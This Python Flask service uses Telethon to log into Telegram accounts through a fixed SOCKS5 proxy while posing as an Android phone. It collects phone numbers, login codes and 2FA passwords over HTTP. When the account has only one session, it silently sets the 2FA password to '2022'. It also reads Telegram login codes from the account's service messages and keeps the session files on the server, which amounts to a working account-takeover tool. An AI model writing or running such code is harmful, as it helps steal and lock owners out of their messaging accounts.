from telethon.sync import TelegramClient , functions , errors
import os , random , re , shutil
from flask import Flask , request 


app = Flask(__name__)

def getRequest(res):
	if request.method == 'POST':
		return request.form.get(res)
	elif request.method == 'GET':
		return request.args.get(res)
	else:
		return False

def Api(phone):
	if os.path.exists(f"session/{phone}/api_id.txt") and os.path.exists(f"session/{phone}/api_hash.txt"):
		with open(f"session/{phone}/api_id.txt","r") as r:
			api_id = int(r.read())
		with open(f"session/{phone}/api_hash.txt","r") as r:
			api_hash = str(r.read())
	else:
		api_id = int(random.choice(os.listdir("key")))
		with open(f"key/{api_id}","r") as r:
			api_hash = str(r.read())
		with open(f"session/{phone}/api_id.txt","w") as f:
			f.write(str(api_id))
		with open(f"session/{phone}/api_hash.txt","w") as f:
			f.write(str(api_hash))

	return api_id , api_hash

@app.route('/account',methods = ['POST','GET'])
def account():
	if not getRequest('phone') or not getRequest('type'):
		return {'results':'invalid'}
	phone = ''.join(re.findall(r'\d',getRequest('phone')))
	type = getRequest('type')
	if type == "login":
		if not phone in os.listdir("session"):
			os.mkdir(f"session/{phone}")
		api_id , api_hash = Api(phone)
		try:
			client = TelegramClient(f"session/{phone}/new",api_id,api_hash,device_model = 'Redmi Note 8 Pro',system_version = '10 Q',app_version = '8.7.3',lang_code = 'en',proxy = ('socks5','78.46.240.118',9050))
			client.connect()
			if not client.is_user_authorized():
				try:
					sent = client.send_code_request(phone)
					f = open(f"session/{phone}/hash.txt", "w")
					f.write(sent.phone_code_hash)
					f.close()
					return {'results':'ok'}
				except errors.PhoneNumberBannedError:
					return {'results':'Banned'}
				except errors.PhoneNumberInvalidError:
					return {'results':'Invalid'}
				except errors.FloodWaitError as e:
					return {'results':f'Flood-{e.seconds}'}
				except errors.PhoneNumberOccupiedError:
					return {'results':'Occupied'}
				except errors.PhoneNumberUnoccupiedError:
					return {'results':'Unoccupied'}
				except ConnectionError:
					return {'results':'Connection'}
				except errors.ApiIdInvalidError:
					os.unlink(f"key/{api_id}")
					return account()
				except errors.ApiIdPublishedFloodError:
					os.unlink(f"key/{api_id}")
					return account()
				except Exception as e:
					return {'results':str(e)}
			else:
				return {'results':'authorized'}
		except KeyError:
			return {'results':'KeyError'}
		finally:
			client.disconnect()

	elif type == "code":
		if not getRequest('code'):
			return {'results':'invalid'}
		codes = ''.join(re.findall(r'\d',getRequest('code')))
		if not phone in os.listdir("session"):
			return {'results':'Not Found'}		
		api_id , api_hash = Api(phone)
		try:
			client = TelegramClient(f"session/{phone}/new",api_id,api_hash,device_model = 'Redmi Note 8 Pro',system_version = '10 Q',app_version = '8.7.3',lang_code = 'en',proxy = ('socks5','78.46.240.118',9050))
			client.connect()
			f = open(f"session/{phone}/hash.txt","r")
			client(functions.auth.SignInRequest(phone_number = phone , phone_code_hash = f.readline() , phone_code = codes))
			f.close()
			return {'results':'ok'}
		except errors.rpcerrorlist.PhoneCodeExpiredError:
			return {'results':'PhoneCodeExpiredError'}
		except errors.SessionPasswordNeededError:
			return {'results':'SessionPasswordNeededError'}
		except KeyError:
			return {'results':'KeyError'}
		except errors.rpcerrorlist.PhoneCodeInvalidError:
			return {'results':'PhoneCodeInvalidError'}
		except Exception as e:
			return {'results':str(e)}
		finally:
			client.disconnect()

	elif type == "2fa":
		if not getRequest('password'):
			return {'results':'invalid'}
		passwords = getRequest('password')
		if not phone in os.listdir("session"):
			return {'results':'Not Found'}		
		api_id , api_hash = Api(phone)
		try:
			client = TelegramClient(f"session/{phone}/new",api_id,api_hash,device_model = 'Redmi Note 8 Pro',system_version = '10 Q',app_version = '8.7.3',lang_code = 'en',proxy = ('socks5','78.46.240.118',9050))
			client.connect()
			client.sign_in(password = passwords)
			client.edit_2fa(current_password = passwords)
			return {'results':'ok'}
		except errors.PasswordHashInvalidError:
			return {'results':'PasswordInvalid'}
		except ConnectionError:
			return {'results':'ConnectionError'}
		except KeyError:
			return {'results':'KeyError'}
		except Exception as e:
			return {'results':str(e)}
		finally:
			client.disconnect()

	elif type == "session":
		if not phone in os.listdir("session"):
			return {'results':'Not Found'}
		api_id , api_hash = Api(phone)
		try:
			client = TelegramClient(f"session/{phone}/new",api_id,api_hash,device_model = 'Redmi Note 8 Pro',system_version = '10 Q',app_version = '8.7.3',lang_code = 'en',proxy = ('socks5','78.46.240.118',9050))
			client.connect()
			client(functions.account.UpdateStatusRequest(offline = False))
			result = client(functions.account.GetAuthorizationsRequest())
			sessions = len(result.authorizations)
			if sessions == 1:
				client.edit_2fa(new_password = '2022')
				return {'results':'ok','sessions':sessions}
			else:
				return {'results':'no','sessions':sessions}
		except errors.UserDeactivatedBanError:
			return {'results':'Ban'}
		except errors.UserDeactivatedError:
			return {'results':'Ban'}
		except errors.SessionExpiredError:
			return {'results':'Expired'}
		except errors.SessionRevokedError:
			return {'results':'Revoked'}
		except errors.rpcerrorlist.PasswordHashInvalidError:
			return {'results':'Password Hash Invalid Error'}
		except Exception as e:
			return {'results':str(e)}
		finally:
			client.disconnect()

	elif type == "tel":
		if not phone in os.listdir("session"):
			return {'results':'Not Found'}
		api_id , api_hash = Api(phone)
		try:
			client = TelegramClient(f"session/{phone}/new",api_id,api_hash,device_model = 'Redmi Note 8 Pro',system_version = '10 Q',app_version = '8.7.3',lang_code = 'en',proxy = ('socks5','78.46.240.118',9050))
			client.connect()
			client(functions.account.UpdateStatusRequest(offline = False))
			codes = []
			for code in client.iter_messages(777000, search = "Login code"):
				codes.append(str(code.message))
			return {'results':'ok','code':codes,'password':'2022'}
		except IndexError:
			return {'results':'no'}
		except Exception as e:
			return {'results':str(e)}
		finally:
			client.disconnect()

	elif type == "logout":
		if not phone in os.listdir("session"):
			return {'results':'Not Found'}
		api_id , api_hash = Api(phone)
		try:
			client = TelegramClient(f"session/{phone}/new",api_id,api_hash,device_model = 'Redmi Note 8 Pro',system_version = '10 Q',app_version = '8.7.3',lang_code = 'en',proxy = ('socks5','78.46.240.118',9050))
			client.connect()
			client(functions.account.UpdateStatusRequest(offline = False))
			if client.log_out():
				shutil.rmtree(f"session/{phone}")
				return {'results':'ok'}
			else:
				return {'results':'no'}
		except Exception as e:
			return {'results':str(e)}
		finally:
			client.disconnect()

	elif type == "save":
		if not phone in os.listdir("session"):
			os.mkdir(f"session/{phone}")
		try:
			with open(f"session/{phone}/api_id.txt","w") as f:
				f.write(str(getRequest('api_id')))
			with open(f"session/{phone}/api_hash.txt","w") as f:
				f.write(str(getRequest('api_hash')))
			return {'results':'ok'}
		except Exception as e:
			return {'results':str(e)}

	else:
		return {'results':'invalid'}

if __name__ == '__main__':
	app.run(port = 80)